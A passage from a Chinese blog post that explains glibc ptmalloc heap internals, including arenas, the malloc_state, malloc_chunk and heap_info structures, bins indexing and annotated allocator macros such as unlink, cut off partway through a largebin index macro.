segment的一部分，而作为全局变量储存在libc.so的数据段中。</p><p>下图是只有一个heap时，主线程和线程的堆结构示意图，左图是Main Arena，右图是Threa Arena。堆是从低地址向高地址增长的，可以看到每一个malloc_chunk上面都跟着一个chunk。同时Main Arena没有heap_info和malloc_state的结构。 </p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-16_095630.png" alt=""></p><p>下图是存在多个heap的thread Arena的情况。可以看到每一个heap都一个heap header（heap_info），但是只有最初的heap拥有arena header(malloc_state).</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-16_095644.png" alt="graph"></p><p>当线程申请内存时，就创建一个Arena。主线程有自己独立的Arena，叫做main arena，但不是每一个线程都有独立的Arena。</p><p>Arena的个数取决于cpu核的个数</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-17_204838.png" alt=""></p><h2 id="三个重要结构体的定义"><a href="#三个重要结构体的定义" class="headerlink" title="三个重要结构体的定义"></a>三个重要结构体的定义</h2><h3 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  __libc_lock_define (, mutex);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="type">int</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span></span><br><span class="line">  <span class="comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span></span><br><span class="line">  <span class="type">int</span> have_fastchunks;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="heap-info"><a href="#heap-info" class="headerlink" title="heap_info"></a>heap_info</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  mstate ar_ptr; <span class="comment">/* Arena for this heap. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span> *<span class="title">prev</span>;</span> <span class="comment">/* Previous heap. */</span></span><br><span class="line">  <span class="type">size_t</span> size;   <span class="comment">/* Current size in bytes. */</span></span><br><span class="line">  <span class="type">size_t</span> mprotect_size; <span class="comment">/* Size in bytes that has been mprotected</span></span><br><span class="line"><span class="comment">                           PROT_READ|PROT_WRITE.  */</span></span><br><span class="line">  <span class="comment">/* Make sure the following data is properly aligned, particularly</span></span><br><span class="line"><span class="comment">     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of</span></span><br><span class="line"><span class="comment">     MALLOC_ALIGNMENT. */</span></span><br><span class="line">  <span class="type">char</span> pad[<span class="number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK];</span><br><span class="line">&#125; heap_info;</span><br></pre></td></tr></table></figure><h2 id="malloc和free的流程"><a href="#malloc和free的流程" class="headerlink" title="malloc和free的流程"></a>malloc和free的流程</h2><h3 id="malloc流程"><a href="#malloc流程" class="headerlink" title="malloc流程"></a>malloc流程</h3><hr><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/1678786338164.png" alt="malloc"></p><h3 id="free流程"><a href="#free流程" class="headerlink" title="free流程"></a>free流程</h3><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/1678786338155.png" alt="free"></p><h2 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h2><h3 id="bins数组相关"><a href="#bins数组相关" class="headerlink" title="bins数组相关"></a>bins数组相关</h3><p>bins数组存在于malloc_state结构体中,它被定义为一个长度为254的数组,但我们都知道真正只有126个bin,及有效下标为[0,251] (多的那两个被浪费了)。</p><p>每个bins都是一个指针,在串联bin中起到了重要作用,同一个bin的fd指针和bk指针被存储在相邻位置(例如bins[0]为unsortedbin的fd指针bins[1]为unsortedbin的bk指针)。</p><p>但其实在讲解过程中我们更多提及的是bin的下标,实际上bin数组是一个更抽象的概念，它实际<strong>并不存在</strong>,但使用bin数组下标与对应各个bin的关系更为直接，因此被更多的使用。</p><p>bins下标[X]与bin下标[Y]的关系为:</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-17_203928.png" alt=""></p><p>这也就是为什么许多教程会说bin[0]和bin[127]不存在了,因为如果这样的话对应的bins下标就为-2和252,明显越界了。</p><p><strong>以上所述其实我也不是很确定，各种教程里面的要么语焉不详没头没尾，要么上下矛盾，我也只能根据源码以及一些比较靠谱的博客做出一种比较合理的解释</strong></p><p>我主要以这两个宏为根据,特别是第二个宏与我上面的公式对上了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> smallbin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) &gt;&gt; 4) : (((unsigned) (sz)) &gt;&gt; 3))\</span></span><br><span class="line"><span class="meta">   + SMALLBIN_CORRECTION) ##这个只是smallbin的索引计算方式,但其他bin大差不差</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bin_at(m, i) \</span></span><br><span class="line"><span class="meta">  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))      \</span></span><br><span class="line"><span class="meta">             - offsetof (struct malloc_chunk, fd))</span></span><br></pre></td></tr></table></figure><h3 id="largebin的双向链表"><a href="#largebin的双向链表" class="headerlink" title="largebin的双向链表"></a>largebin的双向链表</h3><p>largebin的双向链表与smallbin不同在于,一个bin存在两个双向链表</p><p>其中一个与smallbin相同通过fd与bk将属于该bin的所有chunk串联</p><p>另一个则是通过fd_nextsize和bk_nextsize这个双向链表只串联每类大小中的一个,不包括节点bin.相同大小的chunk只有第一个会被串联，其余chunk的nextsize指针依然置为0.</p><h2 id="重要宏解释"><a href="#重要宏解释" class="headerlink" title="重要宏解释"></a>重要宏解释</h2><p>看源码最让人头大的无非各种宏了(建议在vscode中阅读源码,能直接找到声明处。)这里记几个重要的宏,顺便做点解释。</p><h3 id="chunk-at-offset"><a href="#chunk-at-offset" class="headerlink" title="chunk_at_offset"></a>chunk_at_offset</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))</span></span><br></pre></td></tr></table></figure><p>通过一个chunk指针和偏移得到另一个chunk</p><h3 id="retquest2size"><a href="#retquest2size" class="headerlink" title="retquest2size"></a>retquest2size</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Check if a request is so large that it would wrap around zero when</span></span><br><span class="line"><span class="comment">   padded and aligned. To simplify some other code, the bound is made</span></span><br><span class="line"><span class="comment">   low enough so that adding MINSIZE will also not wrap around zero.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                              \</span></span><br><span class="line"><span class="meta">    ((unsigned long) (req) &gt;= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))</span></span><br><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"><span class="comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> request2size(req)                                                      \</span></span><br><span class="line"><span class="meta">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span></span><br><span class="line"><span class="meta">         ? MINSIZE                                                             \</span></span><br><span class="line"><span class="meta">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">/*  Same, except also perform argument check */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> checked_request2size(req, sz)                                          \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (REQUEST_OUT_OF_RANGE(req)) &#123;                                           \</span></span><br><span class="line"><span class="meta">        __set_errno(ENOMEM);                                                   \</span></span><br><span class="line"><span class="meta">        return 0;                                                              \</span></span><br><span class="line"><span class="meta">    &#125;                                                                          \</span></span><br><span class="line"><span class="meta">    (sz) = request2size(req);</span></span><br></pre></td></tr></table></figure><p>调整栈对齐,其中第三个宏整合了前两个,<strong>第二个是重点</strong></p><p>一个细节</p><p>若申请大小零头&lt;=size_sz,则不额外分配这部分内存,而是将下一个chunk的prev_size用以存储这部分数据</p><p>若申请大小零头&gt;size_sz,则向下一个2*size_sz对齐,以求最小损耗</p><h3 id="set-head"><a href="#set-head" class="headerlink" title="set_head"></a>set_head</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Set size at head, without disturbing its use bit */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_head_size(p, s)  ((p)-&gt;mchunk_size = (((p)-&gt;mchunk_size &amp; SIZE_BITS) | (s)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set size/use field */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_head(p, s)       ((p)-&gt;mchunk_size = (s))</span></span><br></pre></td></tr></table></figure><p>给切割或合并后新出现的chunk设置头</p><h3 id="chunksize"><a href="#chunksize" class="headerlink" title="chunksize"></a>chunksize</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunksize(p) (chunksize_nomask (p) &amp; ~(SIZE_BITS))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunksize_nomask(p)         ((p)-&gt;mchunk_size)</span></span><br></pre></td></tr></table></figure><p>得到一个chunk的大小,可选是否忽略inuse位</p><h3 id="inuse"><a href="#inuse" class="headerlink" title="inuse"></a>inuse</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* extract p&#x27;s inuse bit */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> inuse(p)      \</span></span><br><span class="line"><span class="meta">  ((((mchunkptr) (((char *) (p)) + chunksize (p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* set/clear chunk as being inuse without otherwise disturbing */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_inuse(p)      \</span></span><br><span class="line"><span class="meta">  ((mchunkptr) (((char *) (p)) + chunksize (p)))-&gt;mchunk_size |= PREV_INUSE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> clear_inuse(p)      \</span></span><br><span class="line"><span class="meta">  ((mchunkptr) (((char *) (p)) + chunksize (p)))-&gt;mchunk_size &amp;= ~(PREV_INUSE)</span></span><br></pre></td></tr></table></figure><p>分别是得到一个chunk的inuse位,设置inuse位为1,设置inuse位为0.</p><h3 id="bin-at-m-i"><a href="#bin-at-m-i" class="headerlink" title="bin_at(m,i)"></a>bin_at(m,i)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> bin_at(m, i) \</span></span><br><span class="line"><span class="meta">  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))      \</span></span><br><span class="line"><span class="meta">             - offsetof (struct malloc_chunk, fd))</span></span><br></pre></td></tr></table></figure><p>其中offsetof (struct malloc_chunk, fd))是常数<strong>值为16</strong>,所需bin的表头与前两个bins数组元素被视为了一个malloc_chunk(对unsorted bin来说前两个虽然不是bins数组成员,但也可以这样做),也就是说最终的结果就是指向这个chunk的指针,且这个chunk的fd和bk刚好是这个bin的头与尾指针。</p><h3 id="first-b-与last-b"><a href="#first-b-与last-b" class="headerlink" title="first(b)与last(b)"></a>first(b)与last(b)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> first(b)     ((b)-&gt;fd)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> last(b)      ((b)-&gt;bk)</span></span><br></pre></td></tr></table></figure><p>里面的b一般就是bin_at的返回结果,于是刚好指向所需bin的头和尾。</p><h3 id="一些常数值"><a href="#一些常数值" class="headerlink" title="一些常数值"></a>一些常数值</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MINSIZE  \                <span class="comment">//32</span></span></span><br><span class="line">  (<span class="type">unsigned</span> <span class="type">long</span>)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MALLOC_ALIGNMENT (2 * SIZE_SZ &lt; __alignof__ (long double) \         <span class="comment">//16</span></span></span><br><span class="line">  ? __alignof__ (<span class="type">long</span> <span class="type">double</span>) : <span class="number">2</span> * SIZE_SZ)</span><br></pre></td></tr></table></figure><p>MINSIZE宏定义了最小的有效分配大小(32)，它是为了确保分配的内存大小能够容纳一个堆块的头部信息和有效载荷而定义的。</p><p>MALLOC_ALIGNMENT定义了堆块的对齐方式，也就是堆块的起始地址必须是MALLOC_ALIGNMENT(16)的倍数。</p><h3 id="unlink-AV-P-BK-FD"><a href="#unlink-AV-P-BK-FD" class="headerlink" title="unlink(AV, P, BK, FD)"></a>unlink(AV, P, BK, FD)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \<span class="comment">//大小检查</span></span></span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);      \</span><br><span class="line">    FD = P-&gt;fd;      \</span><br><span class="line">    BK = P-&gt;bk;      \</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))      \  <span class="comment">//链表完整性检查</span></span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);      \</span><br><span class="line">    <span class="keyword">else</span> &#123;      \</span><br><span class="line">        FD-&gt;bk = BK;      \</span><br><span class="line">        BK-&gt;fd = FD;      \</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))      \</span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;      \</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)      \</span><br><span class="line">|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);   \</span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;      \</span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)      \</span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;      \</span><br><span class="line">                <span class="keyword">else</span> &#123;      \</span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;      \</span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;      \</span><br><span class="line">                  &#125;      \</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;      \</span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span><br><span class="line">              &#125;      \</span><br><span class="line">          &#125;      \</span><br><span class="line">      &#125;      \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>unlink的出现频率非常高,是一个很重要的宏</p><h4 id="在malloc"><a href="#在malloc" class="headerlink" title="在malloc"></a>在malloc</h4><ol><li>从largebin中取chunk(fastbin,smallbin,unsortedbin都不这样做)</li><li>从比请求的chunk所在的bin大的bin中取chunk</li></ol><h4 id="在free"><a href="#在free" class="headerlink" title="在free"></a>在free</h4><p>一般在free一个chunk-B时,若其前一个chunk-A或后一个chunk-C非top)处于空闲时,则会unlinkA或者C</p><p><strong>一个细节</strong>,被free的chunk定然是没有fd,bk这些指针的,它通过<strong>自己的地址</strong>与<strong>prev_size</strong>或<strong>size</strong>这两个字段的操作来得到上一个或下一个空闲chunk的地址</p><h4 id="在malloc-consolidate"><a href="#在malloc-consolidate" class="headerlink" title="在malloc_consolidate"></a>在malloc_consolidate</h4><p>合并物理相邻的低地址或高地址空闲chunk</p><h4 id="在realloc"><a href="#在realloc" class="headerlink" title="在realloc"></a>在realloc</h4><p>合并物理相邻高地址空闲 chunk</p><h3 id="index"><a href="#index" class="headerlink" title="index"></a>index</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> NBINS             128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NSMALLBINS         64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SMALLBIN_WIDTH    MALLOC_ALIGNMENT</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> in_smallbin_range(sz)  \</span></span><br><span class="line"><span class="meta">  ((unsigned long) (sz) &lt; (unsigned long) MIN_LARGE_SIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> smallbin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) &gt;&gt; 4) : (((unsigned) (sz)) &gt;&gt; 3))\</span></span><br><span class="line"><span class="meta">   + SMALLBIN_CORRECTION)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> largebin_index_32(sz)                                                \</span></span><br><span class="line"><span class="meta">  (((((unsigned long) (sz)) &gt;&gt; 6) <span class="string">&lt;= 38) ?  56 + (((unsigned long) (sz)) &gt;</span>&gt; 6) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 9) <span class="string">&lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;</span>&gt; 9) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 12) <span class="string">&lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;</span>&gt; 12) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 15) <span class="string">&lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;</span>&gt; 15) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 18) <span class="string">&lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;</span>&gt; 18) :\</span></span><br><span class="line"><span class="meta">   126)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> largebin_index_32_big(sz)                                            \</span></span><br><span class="line"><span class="meta">  (((((unsigned long) (sz)) &gt;&gt; 6) <span class="string">&lt;= 45) ?  49 + (((unsigned long) (sz)) &gt;</span>&gt; 6) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 9) <span class="string">&lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;</span>&gt; 9) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 12) <span class="string">&lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;</span>&gt; 12) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 15) <span class="string">&lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;</span>&gt; 15) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 18) <span class="string">&lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;</span>&gt; 18) :\</span></span><br><span class="line"><span class="meta">   126)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// XXX It remains to be seen whether it is good to keep the widths of</span></span><br><span class="line"><span class="comment">// XXX the buckets the same or whether it should be scaled by a factor</span></span><br><span class="line"><span class="comment">// XXX of two as well.</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> largebin_index_64(sz)                                                \</span></span><br><span class="line"><span class="meta">  (((((unsigned long) (sz)) &gt;&gt; 6) <span class="string">&lt;= 48) ?  48 + (((unsigned long) (sz)) &gt;</span>&gt; 6) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 9) <span class="string">&lt;= 20) ?  91 + (((unsigned long) (sz)) 